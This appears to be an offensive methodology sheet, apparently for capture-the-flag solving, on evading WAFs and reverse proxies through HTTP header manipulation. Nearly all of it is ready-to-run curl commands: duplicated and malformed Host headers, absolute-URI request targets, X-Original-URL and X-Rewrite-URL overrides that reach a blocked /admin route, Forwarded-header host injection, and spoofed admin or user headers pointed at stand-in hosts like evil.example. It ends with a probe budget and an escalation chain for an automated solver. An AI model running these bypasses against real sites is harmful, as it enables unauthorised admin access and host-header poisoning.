# Evasion — the per-proxy WAF bypass, exhaustively

The per-proxy bypass — which header for which proxy, which WAF for which surface.

---

## 1. The per-proxy bypass — which header for which proxy

```text
nginx      → Host, X-Forwarded-Host, X-Forwarded-Proto, X-Forwarded-Port,
            X-Forwarded-Server, X-Forwarded-User, X-Forwarded-Email
Traefik    → Host, X-Forwarded-Host, X-Forwarded-Proto, X-Forwarded-Port,
            X-Forwarded-Server
Apache     → Host, X-Forwarded-Host, X-Forwarded-Proto, X-Forwarded-Server,
            X-Forwarded-User
HAProxy    → Host, X-Forwarded-Host, X-Forwarded-Proto, X-Forwarded-User
Cloudflare → Host, CF-Connecting-IP, CF-Ray, CF-Visitor, X-Forwarded-For,
            X-Forwarded-Proto
CloudFront → Host, X-Amzn-Trace-Id, X-Forwarded-For, X-Forwarded-Host,
            X-Forwarded-Proto, CloudFront-Viewer-Country
Akamai     → Host, True-Client-IP, Akamai-Origin-Hop, X-Forwarded-For
Varnish    → Host, X-Forwarded-For, X-Forwarded-Host, X-Forwarded-Proto,
            X-Forwarded-Server, X-Forwarded-User
Squid      → Host, X-Forwarded-For
```

## 2. The duplicated Host bypass — a parsing differential

```bash
# a duplicated Host — the proxy and the app parse differently
curl -s -D - -H 'Host: good.example' -H 'Host: evil.example' "$BASE/"
#   the proxy reads the first; the app reads the second → a differential
curl -s -D - -H 'Host: evil.example' -H 'Host: good.example' "$BASE/"
#   the proxy reads the first; the app reads the second → a differential
```

## 3. The malformed Host bypass — a parsing edge

```bash
# a malformed Host — a parsing edge
curl -s -D - -H 'Host: evil.example:80' "$BASE/"   # a forged port
curl -s -D - -H 'Host: evil.example.' "$BASE/"   # a trailing dot
curl -s -D - -H 'Host: evil.example..target.com' "$BASE/"   # a double-dot
curl -s -D - -H 'Host: ' "$BASE/"   # an empty host
curl -s -D - -H 'Host: evil.example@target.com' "$BASE/"   # an @-separator
curl -s -D - -H 'Host: target.com@evil.example' "$BASE/"   # an @-separator
curl -s -D - -H 'Host: evil.example#target.com' "$BASE/"   # a #-separator
curl -s -D - -H 'Host: target.com#evil.example' "$BASE/"   # a #-separator
curl -s -D - -H 'Host: evil.example?target.com' "$BASE/"   # a ?-separator
curl -s -D - -H 'Host: target.com?evil.example' "$BASE/"   # a ?-separator
```

## 4. The absolute-URI bypass — a request-line differential

```bash
# an absolute-URI Host — a request-line differential
curl -s -D - "$BASE/" --request-target 'http://evil.example/'   # an absolute-URI
curl -s -D - "http://evil.example/" --resolve 'evil.example:443:127.0.0.1'   # an absolute-URI
```

## 5. The X-Original-URL bypass — a middleware rewrite

```bash
# an X-Original-URL — the middleware rewrites the path
curl -i "$BASE/admin"                        # expect 403
curl -i -H 'X-Original-URL: /admin' "$BASE/" # 200 with the admin body = finding
#   the middleware rewrites the path → the admin route reached → an ACL bypass
```

## 6. The X-Rewrite-URL bypass — a middleware rewrite

```bash
# an X-Rewrite-URL — the middleware rewrites the path
curl -i "$BASE/admin"                        # expect 403
curl -i -H 'X-Rewrite-URL: /admin' "$BASE/" # 200 with the admin body = finding
#   the middleware rewrites the path → the admin route reached → an ACL bypass
```

## 7. The X-Forwarded-Path bypass — a middleware rewrite

```bash
# an X-Forwarded-Path — the middleware rewrites the path
curl -i "$BASE/admin"                        # expect 403
curl -i -H 'X-Forwarded-Path: /admin' "$BASE/" # 200 with the admin body = finding
#   the middleware rewrites the path → the admin route reached → an ACL bypass
```

## 8. The X-Forwarded-Prefix bypass — a middleware rewrite

```bash
# an X-Forwarded-Prefix — the middleware rewrites the path
curl -i "$BASE/admin"                        # expect 403
curl -i -H 'X-Forwarded-Prefix: /admin' "$BASE/" # 200 with the admin body = finding
#   the middleware rewrites the path → the admin route reached → an ACL bypass
```

## 9. The Forwarded bypass — the RFC 7239 form

```bash
# a Forwarded header — the RFC 7239 form
curl -s -H 'Forwarded: host=canary.example' "$BASE/page" | grep -o 'canary[^"< ]*'
#   the page's links point to canary.example → a stored injection
curl -s -H 'Forwarded: for=127.0.0.1;host=canary.example;proto=http' "$BASE/page" | grep -o 'canary[^"< ]*'
#   a chained forwarded — the host rewritten
```

## 10. The multi-header bypass — a combined injection

```bash
# a multi-header bypass — a combined injection
curl "$BASE/api/internal" -H 'Host: evil.example' -H 'X-Internal: true'   # a host + an internal
curl "$BASE/api/admin" -H 'Host: evil.example' -H 'X-Admin: true'   # a host + an admin
curl "$BASE/api/user" -H 'Host: evil.example' -H 'X-Forwarded-User: admin'   # a host + a user
curl "$BASE/api" -H 'X-Forwarded-Host: attacker.com' -H 'X-Forwarded-Proto: http'   # a host + a scheme
curl "$BASE/api" -H 'X-Forwarded-Host: attacker.com' -H 'X-Forwarded-Scheme: http'   # a host + a scheme
curl "$BASE/api" -H 'X-Forwarded-Host: attacker.com' -H 'X-Original-URL: /admin'   # a host + a path
```

## 11. The evasion's falsifier — a proxy that validates

```text
a proxy that validates the Host against a server list → a 400 on a bad
host → a negative result, not a retry signal.
```

## 12. The evasion's falsifier — a proxy that strips

```text
a proxy that strips the client-supplied forwarded header → the header
doesn't reach the app → the bypass fails → a different class.
```

## 13. The evasion's falsifier — a proxy that verifies

```text
a proxy that verifies the forwarded header it added → a client-supplied
header is rejected → the bypass fails → a different class.
```

## 14. The evasion's budget — the probe limits

```text
5 probes or 15 minutes per mechanism class; 25 probes or 45 minutes
for the challenge. a spent budget → escalate: chain_match → reclassify
→ writeup_search → novel_plan → fanout_sweep → solver_handoff.
```
